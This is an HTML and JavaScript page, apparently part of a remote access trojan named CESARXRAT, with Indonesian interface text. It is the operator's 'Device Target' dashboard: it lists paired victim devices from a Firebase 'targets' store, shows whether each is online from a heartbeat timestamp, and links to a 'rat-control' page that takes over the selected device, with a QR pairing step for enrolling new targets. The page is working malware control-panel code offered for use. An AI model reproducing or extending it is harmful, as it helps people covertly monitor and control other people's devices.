<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Target - CESARXRAT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e27;
            color: #e0e8ff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
        }
        .container { max-width: 480px; margin: auto; padding: 20px 16px; }
        .header-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 26px; color: #4a9eff; margin: 0;
            font-weight: 800; letter-spacing: 1px;
            text-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
        }
        .btn-qr-top {
            background: linear-gradient(135deg, #4ae0a0, #1a8f5f);
            border: none;
            color: #fff;
            padding: 10px 18px;
            border-radius: 50px;
            font-size: 13px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(74, 224, 160, 0.3);
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .btn-qr-top:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(74, 224, 160, 0.5);
        }
        .device-item {
            background: #111a3a;
            border-radius: 16px;
            padding: 16px 18px;
            margin: 12px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-left: 6px solid #4a9eff;
            border-top: 1px solid #2a4a8a;
            border-right: 1px solid #2a4a8a;
            border-bottom: 1px solid #2a4a8a;
            transition: 0.2s;
        }
        .device-item:hover {
            border-color: #4a9eff;
            box-shadow: 0 0 20px rgba(74, 158, 255, 0.2);
        }
        .device-item.offline {
            border-left-color: #555;
            opacity: 0.7;
        }
        .device-item .info { flex: 1; }
        .device-item .info .name {
            font-weight: bold; color: #fff; font-size: 16px;
        }
        .device-item .info .status {
            font-size: 13px; margin-top: 4px;
        }
        .device-item .info .os {
            font-size: 12px; color: #6a8abf; margin-top: 2px;
        }
        .status-online { color: #4ae0a0; }
        .status-offline { color: #ff6b6b; }
        .device-item .actions {
            display: flex; align-items: center; gap: 10px;
        }
        .btn-control {
            background: linear-gradient(135deg, #4a9eff, #1a5bbf);
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 13px;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-control:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(74, 158, 255, 0.4);
        }
        .btn-control:disabled {
            background: #2a4a8a;
            cursor: not-allowed;
            opacity: 0.5;
        }
        .empty-state {
            text-align: center; color: #6a8abf;
            padding: 40px 20px; font-style: italic;
            background: #111a3a; border-radius: 16px;
            border: 1px dashed #2a4a8a;
        }
        .empty-state .icon {
            font-size: 48px; display: block; margin-bottom: 10px;
        }
        .btn-back {
            background: transparent; border: 2px solid #4a9eff;
            color: #4a9eff; padding: 12px 24px;
            border-radius: 50px; font-weight: bold;
            cursor: pointer; transition: 0.3s;
            width: 100%; margin-top: 24px;
            text-align: center; font-size: 16px;
        }
        .btn-back:hover { background: #4a9eff; color: #fff; }
        .refresh-info {
            text-align: center; font-size: 11px;
            color: #6a8abf; margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header-row">
            <h1>Device Target</h1>
            <button class="btn-qr-top" onclick="location.href='qr-pairing.html'">
                📷 QR Pairing
            </button>
        </div>

        <div id="deviceList">
            <div class="empty-state">
                <span class="icon">📱</span>
                Memuat daftar perangkat...
            </div>
        </div>

        <button class="btn-back" onclick="history.back()">Kembali</button>
        <div class="refresh-info">🔄 Update real-time dari Firebase</div>
    </div>

    <script type="module">
        import { auth, onAuthStateChanged, db, ref, onValue } from './firebase-config.js';

        const listEl = document.getElementById('deviceList');
        const TIMEOUT_MS = 30000;
        let currentUid = null;

        onAuthStateChanged(auth, (user) => {
            if (!user) {
                window.location.href = 'login.html';
                return;
            }
            currentUid = user.uid;
            loadDevices();
        });

        function loadDevices() {
            if (!currentUid) return;

            const targetsRef = ref(db, 'targets');
            onValue(targetsRef, (snapshot) => {
                const data = snapshot.val();
                const now = Date.now();
                let html = '';
                let count = 0;

                if (data && Object.keys(data).length > 0) {
                    for (const key in data) {
                        const target = data[key];
                        if (!target || !target.name) continue;

                        // FILTER: hanya device milik user ini
                        if (target.owner_uid !== currentUid) continue;

                        let isOnline = false;
                        if (target.timestamp) {
                            const diff = now - target.timestamp;
                            isOnline = diff < TIMEOUT_MS && target.status === 'online';
                        }

                        const statusClass = isOnline ? 'status-online' : 'status-offline';
                        const statusText = isOnline ? '● Online' : '● Offline';
                        const itemClass = isOnline ? '' : 'offline';
                        const disabledAttr = isOnline ? '' : 'disabled';

                        html += `
                            <div class="device-item ${itemClass}">
                                <div class="info">
                                    <div class="name">${escapeHtml(target.name)}</div>
                                    <div class="os">${escapeHtml(target.os || '- - -')}</div>
                                    <div class="status ${statusClass}">${statusText}</div>
                                </div>
                                <div class="actions">
                                    <button class="btn-control" ${disabledAttr}
                                        data-target="${key}"
                                        data-online="${isOnline}">
                                        KONTROL
                                    </button>
                                </div>
                            </div>
                        `;
                        count++;
                    }
                }

                if (count === 0) {
                    listEl.innerHTML = `
                        <div class="empty-state">
                            <span class="icon">📱</span>
                            Belum ada perangkat target.<br><br>
                            Klik <b>QR Pairing</b> di atas<br>
                            untuk menghubungkan device baru.
                        </div>
                    `;
                } else {
                    listEl.innerHTML = html;

                    document.querySelectorAll('.btn-control').forEach(function(btn) {
                        btn.addEventListener('click', function(e) {
                            e.stopPropagation();
                            const targetId = this.dataset.target;
                            const isOnline = this.dataset.online === 'true';

                            if (!isOnline) {
                                alert('❌ Target sedang offline.');
                                return;
                            }

                            window.location.href = 'rat-control.html?target=' + targetId;
                        });
                    });
                }
            });
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        console.log('[CESARXRAT] Device Target real-time aktif');
    </script>
</body>
</html>
